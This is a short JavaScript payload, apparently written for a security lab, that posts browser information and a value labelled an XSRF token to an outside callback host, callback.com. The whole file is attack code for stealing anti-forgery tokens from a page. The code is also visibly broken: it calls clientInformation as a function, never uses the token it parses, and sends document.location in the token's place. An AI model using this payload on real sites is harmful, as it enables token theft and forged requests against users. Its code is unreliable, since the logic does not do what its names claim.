function getXSRFToken() {
    var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://callback.com/?id=" + clientInformation(), true);
    xhr.setRequestHeader("Content-Type", "application/json");

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var response = JSON.parse(xhr.responseText);
            if (response && response._.$n) {
                var xsrfToken = response._.$n.messageId;
                sendToLabMachine(document.location);
            }
        }
    };

    xhr.send(JSON.stringify({
        your: "data",
        here: "value"
    }));
}

function sendToLabMachine(token) {
    var labXhr = new XMLHttpRequest();
    labXhr.open("POST", "https://callback.com/?id=", true);
    labXhr.setRequestHeader("Content-Type", "application/json");

    labXhr.onreadystatechange = function() {
        if (labXhr.readyState === 4 && labXhr.status === 200) {
            console.log("Token sent to lab machine successfully.");
        }
    };

    labXhr.send(JSON.stringify({
        xsrfToken: token
    }));
}

getXSRFToken();
